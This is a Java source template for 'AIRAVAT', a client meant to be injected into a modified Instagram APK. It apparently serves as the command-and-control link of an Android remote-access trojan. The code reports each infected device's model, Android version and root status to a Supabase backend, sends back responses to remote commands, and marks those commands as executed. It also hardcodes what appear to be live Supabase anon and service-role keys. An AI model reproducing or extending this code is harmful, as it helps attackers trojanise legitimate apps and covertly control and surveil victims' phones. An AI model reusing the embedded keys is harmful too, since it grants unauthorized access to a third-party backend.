/**
 * AIRAVAT Supabase Client - APK Modification Template
 * 
 * INSTRUCTIONS FOR USE:
 * ====================
 * 
 * This is a template file for APK modification. To integrate:
 * 
 * 1. Replace YOUR_SUPABASE_* constants with actual credentials
 * 2. Uncomment package declaration and imports when integrating
 * 3. Use SupabaseClient.java for full Android project integration
 * 4. Use this template for direct APK modification scenarios
 * 
 * CURRENT STATE: Template with your actual Supabase credentials
 * TARGET STATE: Copy into Android project and uncomment imports
 */

// Uncomment when integrating into Android project:
// package com.instagram.android.supabase;

// Uncomment these imports when integrating:
// import android.content.Context;
// import android.content.SharedPreferences;
// import android.util.Log;
// import org.json.JSONArray;
// import org.json.JSONException;
// import org.json.JSONObject;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Supabase Client Template - Replace YOUR_SUPABASE_* with actual values
 */
public class SupabaseClientTemplate {
    private static final String TAG = "SupabaseClient";
    private static SupabaseClientTemplate instance;
    
    // Your actual Supabase configuration - ready to use:
    private static final String YOUR_SUPABASE_URL = "https://auedkftrlingnnyeezgc.supabase.co";
    private static final String YOUR_SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF1ZWRrZnRybGluZ25ueWVlemdjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTcxNjI0MzksImV4cCI6MjA3MjczODQzOX0.YHDJFIW6yAQQpe7Jiux85VtIq-LkeOIpDeIgWNvQrZM";
    private static final String YOUR_SUPABASE_SERVICE_ROLE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF1ZWRrZnRybGluZ25ueWVlemdjIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1NzE2MjQzOSwiZXhwIjoyMDcyNzM4NDM5fQ.M5PJ9KUAD5ap6hzpyHAKp35YbO1K-A_btuZIMJGoKmc";
    
    private String supabaseUrl;
    private String anonKey;
    private String serviceRoleKey;
    private ExecutorService executor;
    
    // When integrating: Replace Object with Context
    private Object context; 
    
    private SupabaseClientTemplate(Object context) { // Replace Object with Context
        this.executor = Executors.newCachedThreadPool();
        this.supabaseUrl = YOUR_SUPABASE_URL;
        this.anonKey = YOUR_SUPABASE_ANON_KEY;
        this.serviceRoleKey = YOUR_SUPABASE_SERVICE_ROLE_KEY;
        
        System.out.println("SupabaseClient initialized"); // Replace with Log.i when integrating
    }
    
    public static synchronized SupabaseClientTemplate getInstance(Object context) { // Replace Object with Context
        if (instance == null) {
            instance = new SupabaseClientTemplate(context);
        }
        return instance;
    }
    
    /**
     * Register device - Template method
     */
    public void registerDevice(String deviceId, String deviceModel, String androidVersion, 
                              String batteryLevel, String isRooted) {
        executor.execute(() -> {
            try {
                String deviceJson = String.format(
                    "{\"device_id\":\"%s\",\"device_model\":\"%s\",\"android_version\":\"%s\"," +
                    "\"battery_level\":\"%s\",\"is_rooted\":\"%s\",\"last_seen\":\"%s\"}",
                    deviceId, deviceModel, androidVersion, batteryLevel, isRooted, getCurrentTimestamp()
                );
                
                String response = makeRequest("POST", "/rest/v1/online_devices", deviceJson, true);
                System.out.println("Device registered: " + response);
            } catch (Exception e) {
                System.err.println("Registration error: " + e.getMessage());
            }
        });
    }
    
    /**
     * Send response - Template method
     */
    public void sendResponse(String deviceId, long commandId, String responseData) {
        executor.execute(() -> {
            try {
                String responseJson = String.format(
                    "{\"device_id\":\"%s\",\"command_id\":%d,\"response_data\":\"%s\",\"response_type\":\"command_response\"}",
                    deviceId, commandId, responseData
                );
                
                String response = makeRequest("POST", "/rest/v1/device_responses", responseJson, true);
                updateCommandStatus(commandId, "completed");
                System.out.println("Response sent: " + response);
            } catch (Exception e) {
                System.err.println("Response error: " + e.getMessage());
            }
        });
    }
    
    private void updateCommandStatus(long commandId, String status) {
        try {
            String statusJson = String.format(
                "{\"status\":\"%s\",\"executed_at\":\"%s\"}",
                status, getCurrentTimestamp()
            );
            makeRequest("PATCH", "/rest/v1/device_commands?id=eq." + commandId, statusJson, true);
        } catch (Exception e) {
            System.err.println("Status update error: " + e.getMessage());
        }
    }
    
    private String makeRequest(String method, String endpoint, String data, boolean useServiceRole) {
        try {
            URL url = URI.create(supabaseUrl + endpoint).toURL();
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            
            conn.setRequestMethod(method);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("apikey", useServiceRole ? serviceRoleKey : anonKey);
            conn.setRequestProperty("Authorization", "Bearer " + (useServiceRole ? serviceRoleKey : anonKey));
            
            if ("POST".equals(method) || "PATCH".equals(method)) {
                conn.setDoOutput(true);
                if (data != null) {
                    try (OutputStream os = conn.getOutputStream()) {
                        os.write(data.getBytes("UTF-8"));
                    }
                }
            }
            
            int responseCode = conn.getResponseCode();
            InputStream inputStream = responseCode >= 200 && responseCode < 300 
                ? conn.getInputStream() : conn.getErrorStream();
            
            StringBuilder response = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
            }
            
            if (responseCode >= 200 && responseCode < 300) {
                return response.toString();
            } else {
                throw new IOException("HTTP " + responseCode + ": " + response.toString());
            }
        } catch (Exception e) {
            throw new RuntimeException("Request failed: " + e.getMessage(), e);
        }
    }
    
    private String getCurrentTimestamp() {
        return new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US)
            .format(new java.util.Date());
    }
}

/* 
INTEGRATION CHECKLIST:
======================

When integrating into Android project:

1. Rename this class to SupabaseClient
2. Uncomment package declaration at top
3. Uncomment all Android imports
4. Replace Object with Context in method signatures
5. Replace System.out.println with Log.i/Log.e
6. Add full method implementations from SupabaseClient.java
7. Add DeviceInfoHelper class (see SupabaseClient.java)
8. Add callback interfaces
9. Test integration with Android SDK

Your Supabase credentials are already configured in this template.
*/
